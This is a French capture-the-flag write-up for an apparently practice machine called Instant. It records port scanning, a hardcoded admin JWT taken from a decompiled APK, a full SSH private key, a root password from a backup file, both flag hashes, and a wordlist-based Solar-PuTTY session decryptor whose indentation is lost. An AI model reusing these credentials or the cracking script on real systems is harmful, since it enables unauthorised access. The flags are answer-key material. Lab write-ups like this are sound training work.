# Enumeration des ports

```js
nmap -sV -sC 10.129.52.26
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-18 11:58 +0000
Nmap scan report for 10.129.52.26
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.60 seconds
```


# ENumeration du port 80

Sous domaine trouver apres avoir a lancer la commande `grep` sur l'application trouver

![](Pasted-image-20260818123031.png)

# Sous domaine trouver

```js
mywalletv1.instant.htb
```

```js
swagger-ui.instant.htb
```

![[Pasted image 20260819083313.png]]
# Finding dans l'apk

```js
/* JADX INFO: loaded from: classes.dex */  
public class AdminActivities {  
    private String TestAdminAuthorization() {  
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1  
            static final /* synthetic */ boolean $assertionsDisabled = false;  
  
            @Override // okhttp3.Callback  
            public void onFailure(Call call, IOException iOException) {  
                System.out.println("Error Here : " + iOException.getMessage());  
            }  
  
            @Override // okhttp3.Callback  
            public void onResponse(Call call, Response response) throws IOException {  
                if (response.isSuccessful()) {  
                    try {  
                        System.out.println(JsonParser.parseString(response.body().string()).getAsJsonObject().get("username").getAsString());  
                    } catch (JsonSyntaxException e) {  
                        System.out.println("Error Here : " + e.getMessage());  
                    }  
                }  
            }  
        });  
        return "Done";  
    }  
}
```

## Admin jwt token

```js
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```


# Decouverte du id_rsa du l'user

![[Pasted image 20260819083738.png]]


```js
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

![[Pasted image 20260819084808.png]]


# User.txt 

```js
ab10f82bdb7e26e36a96856a15308534
```


# FIndind d'un ficher backup dans le /opt

```js
root:12**24nzC!r0c%q12
```

## PoC

```python
import argparse

import base64

from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from cryptography.hazmat.primitives import hashes

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

from cryptography.hazmat.backends import default_backend

import json

import sys

from typing import List, Tuple

  
  

def decrypt(password: str, ciphertext: str) -> str:

try:

# Decode the base64 encoded ciphertext

array = base64.b64decode(ciphertext)

salt = array[:24]

iv = array[24:32]

encrypted_data = array[32:]

  

# Derive the key from the password using PBKDF2

kdf = PBKDF2HMAC(

algorithm=hashes.SHA1(),

length=24, # Triple DES key size

salt=salt,

iterations=1000,

backend=default_backend()

)

key = kdf.derive(password.encode())

  

# Create the cipher and decrypt the data

cipher = Cipher(algorithms.TripleDES(key), modes.CBC(iv), backend=default_backend())

decryptor = cipher.decryptor()

decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()

  

data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())

return data

  

except Exception as e:

print(f'Error: {e}')

  

def decrypt_wrapper(passwords: List[str], cipher: [str]) -> Tuple[str, str]: # type: ignore

for i, password in enumerate(passwords):

password: str = password.strip()

decrypted: str = decrypt(password, cipher)

if decrypted and 'Credentials' in decrypted:

print(f"✔ Correct password found on line {i}: {password}")

return (decrypted, password)

else:

print(f"❌ Password={password} is incorrect!")

  

def debug_decrypted_payload(decrypted: str):

'''

Useful to debug any unexpected bytes.

'''

import base64

encoded_bytes = decrypted.encode("utf8")

base64_bytes = base64.b64encode(encoded_bytes)

base64_string = base64_bytes.decode("utf8")

print(encoded_bytes)

print(base64_string)

  

if __name__ == "__main__":

parser = argparse.ArgumentParser(description='Decrypt Solar-PuTTY session using a password or wordlist.')

parser.add_argument('session', help='Path to the Solar-PuTTY session (.dat) file.')

parser.add_argument('-wl', '--wordlist', help='Path to the wordlist file (optional).', nargs='?')

parser.add_argument('-p', '--password', help='Password to use for decryption (optional).', nargs='?')

  

args = parser.parse_args()

  

if len(sys.argv) != 4:

print(sys.argv)

print("Usage: python SolarPuttyDecryptor.py <session_file> -wl <wordlist> or -p <password>")

exit(1)

  

with open(args.session, 'r', encoding='UTF8') as f:

ciphertext: str = f.read()

  

if args.password:

decrypted, password = decrypt_wrapper([args.password], ciphertext)

elif args.wordlist:

with open(args.wordlist, 'r', encoding='UTF8') as passwords:

decrypted, password = decrypt_wrapper(passwords, ciphertext)

else:

parser.print_help()

print("Error: Either a password or a wordlist must be provided.")

exit(2)

try:

# Some gibberish could exist in begining.

cleaned_up_decrypted: str = decrypted[decrypted.index('['):]

fixed_decrypted: str = '{"Sessions":' + cleaned_up_decrypted

# Some gibberish bytes could exist at end. Part of the fun...

fixed_decrypted = fixed_decrypted.replace("\\","_").replace(b'\x01'.decode('UTF8'), '')

decrypted_json: str = json.loads(fixed_decrypted)

print('🚀🚀🚀🚀🚀')

  

print(json.dumps(decrypted_json, indent=4))

except json.JSONDecodeError as e:

print("💀 Invalid JSON:", e)

print(decrypted)

exit(3)
```


# Root.txt

```js
ab56db471a724acf5cd324de17198c7f
```